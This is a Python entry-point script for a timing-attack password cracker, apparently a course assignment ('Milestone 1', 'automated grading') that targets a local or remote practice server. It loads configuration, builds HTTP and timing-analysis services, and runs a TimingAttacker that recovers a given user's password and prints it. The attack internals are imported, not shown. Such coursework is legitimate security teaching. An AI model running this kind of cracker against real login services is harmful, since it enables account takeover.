"""
Main entry point for the timing attack program.

Orchestrates dependency injection and attack execution.

Author: Your Name
Date: 2025
"""

import sys
import os
import time
from pathlib import Path
import yaml

from src.core.exceptions import TimingAttackException, ConfigurationError
from src.services.http_service import HttpClient
from src.services.analysis_service import AnalysisService
from src.services.timing_service import TimingService, SamplingStrategy
from src.attack.timing_attacker import TimingAttacker, AttackConfig
from src.utils.logger import Logger


def load_config(config_path: str = "config/config.yaml") -> dict:
    """
    Load configuration from YAML file.

    Args:
        config_path: Path to configuration file

    Returns:
        Configuration dictionary

    Raises:
        ConfigurationError: If config file not found or invalid
    """
    try:
        with open(config_path, 'r') as f:
            return yaml.safe_load(f)
    except FileNotFoundError:
        raise ConfigurationError(f"Config file not found: {config_path}")
    except yaml.YAMLError as e:
        raise ConfigurationError(f"Invalid YAML config: {str(e)}")


def get_username_from_env() -> str:
    """
    Get username from environment variable or prompt user.

    Returns:
        Username string
    """
    username = os.environ.get('TARGET_USERNAME')

    if not username:
        # For automated grading, read from command line argument
        if len(sys.argv) > 1:
            username = sys.argv[1]
        else:
            # Fallback to interactive prompt (for development)
            username = input("Enter username (ID): ").strip()

    if not username:
        raise ConfigurationError("Username not provided")

    return username


def main():
    """
    Main execution function.

    Flow:
    1. Load configuration
    2. Initialize dependencies (DI pattern)
    3. Execute attack
    4. Print result
    5. Clean up resources

    Exit codes:
    0 - Success
    1 - Configuration error
    2 - Attack failed
    3 - Other error
    """
    start_time = time.time()

    try:
        # Load configuration
        config = load_config()

        # Initialize logger
        logger = Logger(
            name="TimingAttack",
            level=config['logging']['level'],
            log_file=config['logging'].get('file'),
            console=config['logging']['console']
        )

        logger.info("="*60)
        logger.info("Timing Attack - Milestone 1")
        logger.info("="*60)

        # Get username
        username = get_username_from_env()
        difficulty = config['attack']['difficulty']

        logger.info(f"Target: {username}")
        logger.info(f"Difficulty: {difficulty}")

        # Determine which server to use
        use_local = os.environ.get('USE_LOCAL_SERVER', 'true').lower() == 'true'
        base_url = config['server']['base_url'] if use_local else config['server']['remote_url']
        logger.info(f"Server: {base_url}")

        # Initialize dependencies (Dependency Injection)
        http_client = HttpClient(
            base_url=base_url,
            timeout=config['server']['timeout'],
            max_retries=config['server']['max_retries'],
            pool_size=config['performance']['pool_size'],
            logger=logger
        )

        timing_analyzer = AnalysisService(
            confidence_level=config['attack']['thresholds']['confidence_level'],
            min_time_difference=config['attack']['thresholds']['min_time_difference'],
            outlier_threshold=config['attack']['thresholds']['outlier_std_dev'],
            logger=logger
        )

        sampling_strategy = SamplingStrategy(
            initial_samples=config['attack']['timing']['initial_samples'],
            middle_samples=config['attack']['timing']['middle_samples'],
            final_samples=config['attack']['timing']['final_samples'],
            min_samples=config['attack']['timing']['min_samples']
        )

        timing_service = TimingService(
            http_client=http_client,
            sampling_strategy=sampling_strategy,
            logger=logger
        )

        attack_config = AttackConfig(
            charset=config['attack']['charset'],
            max_length=config['attack']['max_password_length'],
            verify_each_char=True
        )

        attacker = TimingAttacker(
            http_client=http_client,
            timing_analyzer=timing_analyzer,
            timing_service=timing_service,
            config=attack_config,
            logger=logger
        )

        # Execute attack
        logger.info("\nStarting attack...\n")

        password = attacker.crack_password(
            username=username,
            difficulty=difficulty,
            max_length=attack_config.max_length
        )

        elapsed_time = time.time() - start_time

        # Output results (ONLY password for grading)
        print(password)

        # Log additional info (not printed to stdout)
        logger.info("\n" + "="*60)
        logger.info(f"✓ SUCCESS")
        logger.info(f"Password: {password}")
        logger.info(f"Length: {len(password)} characters")
        logger.info(f"Time: {elapsed_time:.2f} seconds")
        logger.info("="*60)

        # Clean up
        http_client.close()

        return 0

    except ConfigurationError as e:
        print(f"Configuration error: {str(e)}", file=sys.stderr)
        return 1

    except TimingAttackException as e:
        print(f"Attack failed: {str(e)}", file=sys.stderr)
        return 2

    except KeyboardInterrupt:
        print("\nAttack interrupted by user", file=sys.stderr)
        return 3

    except Exception as e:
        print(f"Unexpected error: {str(e)}", file=sys.stderr)
        import traceback
        traceback.print_exc()
        return 3


if __name__ == "__main__":
    sys.exit(main())